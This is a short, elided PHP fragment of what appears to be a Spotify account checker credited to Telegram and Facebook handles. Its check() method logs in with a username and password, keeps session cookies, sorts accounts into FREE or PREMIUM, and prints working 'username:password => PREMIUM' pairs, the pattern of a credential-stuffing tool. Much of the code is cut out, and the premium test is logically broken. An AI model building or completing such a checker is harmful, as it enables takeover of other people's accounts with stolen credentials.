<?php
/**
 * API Login created By @DrWean
 * Last Update: 22/03/2017
 * Time: 13.32
 * Telegram @DrWean
 * Checker created by Junior Hilario Jara
 * FB : Junior Hilario Jara
 */

//spotify class - do not touch (no tocar)
   ...
   public function check($username, $password){  
	...
	$output['cookies'] = $cookies;
		...
		$output_check['subscription'] = "FREE";
            ...
            } elseif (strpos($result, "re currently Spotify Premium.") !== true) {
		$output_check['subscription'] = "PREMIUM";
		$suscripcion = "\033[01;32mPREMIUM\033[0m\n";
		echo $username.":".$password." => ".$suscripcion;
	    } else{
